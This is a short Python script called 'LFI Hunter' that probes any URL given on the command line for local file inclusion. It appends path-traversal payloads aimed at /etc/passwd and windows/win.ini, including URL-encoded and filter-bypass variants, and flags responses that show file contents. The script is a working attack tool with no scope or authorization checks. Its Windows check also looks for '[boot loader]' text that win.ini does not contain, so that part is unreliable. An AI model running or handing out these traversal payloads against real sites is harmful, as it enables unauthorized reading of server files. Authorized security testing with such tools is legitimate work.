#!/usr/bin/env python3
import requests
import sys

# Expanded LFI test patterns with more path traversal variations
test_payloads = [
    # Linux payloads
    '../../../../../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../etc/passwd',
    '../etc/passwd',
    '/etc/passwd',
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    
    # Windows payloads
    '../../../../../../../../windows/win.ini',
    '../../../../../windows/win.ini',
    '../../windows/win.ini',
    '../windows/win.ini',
    '/windows/win.ini',
    '..\\..\\..\\windows\\win.ini',
    'C:\\windows\\win.ini',
    
    # File URI scheme
    'file:///etc/passwd'
]

def test_lfi(url):
    """
    Test a URL for Local File Inclusion vulnerability
    """
    print(f"\nTesting URL: {url}")
    found_vulnerabilities = []
    
    # Try each payload one by one
    for payload in test_payloads:
        try:
            # Add the payload to the URL
            test_url = url + payload
            
            # Send the request
            response = requests.get(test_url, timeout=5)
            
            # Check for Linux files
            if "root:x:" in response.text:
                found_vulnerabilities.append(("Linux", payload))
            
            # Check for Windows files
            elif "[boot loader]" in response.text:
                found_vulnerabilities.append(("Windows", payload))
                
        except Exception as e:
            continue
    
    # Print results only if vulnerabilities found
    if found_vulnerabilities:
        print("\n[+] LFI Vulnerabilities Found:")
        for system, payload in found_vulnerabilities:
            print(f"  {system} vulnerability with payload: {payload}")
        return True
    else:
        print("\n[-] No LFI vulnerabilities found")
        return False

def main():
    print("LFI Hunter ")
    print("=" * 30)
    
    # Check if URL was provided
    if len(sys.argv) < 2:
        print("\nUsage: python lfi_detector.py <URL>")
        print("Example: python lfi_detector.py http://example.com/page.php")
        sys.exit()
    
    # Get the URL from command line
    url = sys.argv[1]
    
    # Make sure URL starts with http:// or https://
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # Run the test
    test_lfi(url)

if __name__ == "__main__":
    main()